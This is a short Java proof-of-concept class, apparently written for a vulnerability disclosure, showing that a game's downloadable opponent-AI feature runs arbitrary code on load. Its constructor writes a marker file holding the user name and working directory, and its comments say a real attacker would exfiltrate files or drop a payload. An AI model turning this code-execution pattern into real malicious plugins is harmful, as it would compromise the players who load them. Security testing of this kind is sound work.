// The "opponent AI" a victim downloads and loads. To the game it is just an AI
// class; its constructor runs arbitrary code with the game process's privileges.
// A real attacker would exfiltrate files, drop a payload, etc. Here it writes a
// proof marker so the PoC is self-contained and harmless.

import java.io.File;
import java.io.FileWriter;

public class MaliciousAI {
    public MaliciousAI() {
        try {
            File marker = new File(System.getProperty("java.io.tmpdir"),
                                   "apogames_poc1_pwned.txt");
            try (FileWriter w = new FileWriter(marker)) {
                w.write("Arbitrary code executed via AI-class loading feature.\n");
                w.write("user=" + System.getProperty("user.name") + "\n");
                w.write("cwd=" + System.getProperty("user.dir") + "\n");
            }
            System.out.println("[MaliciousAI] *** CODE EXECUTION *** wrote " + marker);
        } catch (Exception e) {
            System.out.println("[MaliciousAI] payload error: " + e);
        }
    }
}
